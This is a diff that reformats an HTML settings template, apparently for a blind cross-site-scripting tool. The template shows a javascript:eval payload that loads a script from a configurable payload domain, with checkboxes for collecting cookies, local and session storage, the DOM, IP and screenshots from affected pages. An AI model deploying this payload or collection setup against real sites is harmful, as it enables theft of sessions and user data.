@@ -45,7 +45,8 @@
 
                                 <label class="control-label">Create Element</label>
                                 <input class="form-control"
-                                       disabled value="javascript:eval('var a=document.createElement(\'script\');a.src=\'//{{setting[payload-domain]}}\';document.body.appendChild(a)')"><br>
+                                       disabled
+                                       value="javascript:eval('var a=document.createElement(\'script\');a.src=\'//{{setting[payload-domain]}}\';document.body.appendChild(a)')"><br>
 
                                 <label class="control-label">Custom Payload example</label>
                                 <input class="form-control" disabled
@@ -64,27 +65,32 @@
                                     <div class="col-lg-6">
                                         <div class="form-group">
                                             <label class="checkbox-label" style="display:inline">
-                                                <input class="chkbox" type="checkbox" name="selected" id="select[uri]" {{collectSelected[uri]}}>
+                                                <input class="chkbox" id="select[uri]" name="selected" type="checkbox"
+                                                       {{collectSelected[uri]}}>
                                                 <span class="checkbox-custom rectangular"></span>
                                             </label>
                                             <p class="checkbox-text">URL</p>
                                             <label class="checkbox-label" style="display:inline">
-                                                <input class="chkbox" type="checkbox" name="selected" id="select[ip]" {{collectSelected[ip]}}>
+                                                <input class="chkbox" id="select[ip]" name="selected" type="checkbox"
+                                                       {{collectSelected[ip]}}>
                                                 <span class="checkbox-custom rectangular"></span>
                                             </label>
                                             <p class="checkbox-text">IP</p>
                                             <label class="checkbox-label" style="display:inline">
-                                                <input class="chkbox" type="checkbox" name="selected" id="select[referer]" {{collectSelected[referer]}}>
+                                                <input class="chkbox" id="select[referer]" name="selected"
+                                                       type="checkbox" {{collectSelected[referer]}}>
                                                 <span class="checkbox-custom rectangular"></span>
                                             </label>
                                             <p class="checkbox-text">Referer</p>
                                             <label class="checkbox-label" style="display:inline">
-                                                <input class="chkbox" type="checkbox" name="selected" id="select[user-agent]" {{collectSelected[user-agent]}}>
+                                                <input class="chkbox" id="select[user-agent]" name="selected"
+                                                       type="checkbox" {{collectSelected[user-agent]}}>
                                                 <span class="checkbox-custom rectangular"></span>
                                             </label>
                                             <p class="checkbox-text">User Agent</p>
                                             <label class="checkbox-label" style="display:inline">
-                                                <input class="chkbox" type="checkbox" name="selected" id="select[cookies]" {{collectSelected[cookies]}}>
+                                                <input class="chkbox" id="select[cookies]" name="selected"
+                                                       type="checkbox" {{collectSelected[cookies]}}>
                                                 <span class="checkbox-custom rectangular"></span>
                                             </label>
                                             <p class="checkbox-text">Cookies</p>
@@ -93,27 +99,32 @@
                                     <div class="col-lg-6">
                                         <div class="form-group">
                                             <label class="checkbox-label" style="display:inline">
-                                                <input class="chkbox" type="checkbox" name="selected" id="select[localstorage]" {{collectSelected[localstorage]}}>
+                                                <input class="chkbox" id="select[localstorage]" name="selected"
+                                                       type="checkbox" {{collectSelected[localstorage]}}>
                                                 <span class="checkbox-custom rectangular"></span>
                                             </label>
                                             <p class="checkbox-text">Local Storage</p>
                                             <label class="checkbox-label" style="display:inline">
-                                                <input class="chkbox" type="checkbox" name="selected" id="select[sessionstorage]" {{collectSelected[sessionstorage]}}>
+                                                <input class="chkbox" id="select[sessionstorage]" name="selected"
+                                                       type="checkbox" {{collectSelected[sessionstorage]}}>
                                                 <span class="checkbox-custom rectangular"></span>
                                             </label>
                                             <p class="checkbox-text">Session Storage</p>
                                             <label class="checkbox-label" style="display:inline">
-                                                <input class="chkbox" type="checkbox" name="selected" id="select[dom]" {{collectSelected[dom]}}>
+                                                <input class="chkbox" id="select[dom]" name="selected" type="checkbox"
+                                                       {{collectSelected[dom]}}>
                                                 <span class="checkbox-custom rectangular"></span>
                                             </label>
                                             <p class="checkbox-text">DOM</p>
                                             <label class="checkbox-label" style="display:inline">
-                                                <input class="chkbox" type="checkbox" name="selected" id="select[origin]" {{collectSelected[origin]}}>
+                                                <input class="chkbox" id="select[origin]" name="selected"
+                                                       type="checkbox" {{collectSelected[origin]}}>
                                                 <span class="checkbox-custom rectangular"></span>
                                             </label>
                                             <p class="checkbox-text">Origin</p>
                                             <label class="checkbox-label" style="display:inline">
-                                                <input class="chkbox" type="checkbox" name="selected" id="select[screenshot]" {{collectSelected[screenshot]}}>
+                                                <input class="chkbox" id="select[screenshot]" name="selected"
+                                                       type="checkbox" {{collectSelected[screenshot]}}>
                                                 <span class="checkbox-custom rectangular"></span>
                                             </label>
                                             <p class="checkbox-text">Screenshot</p>
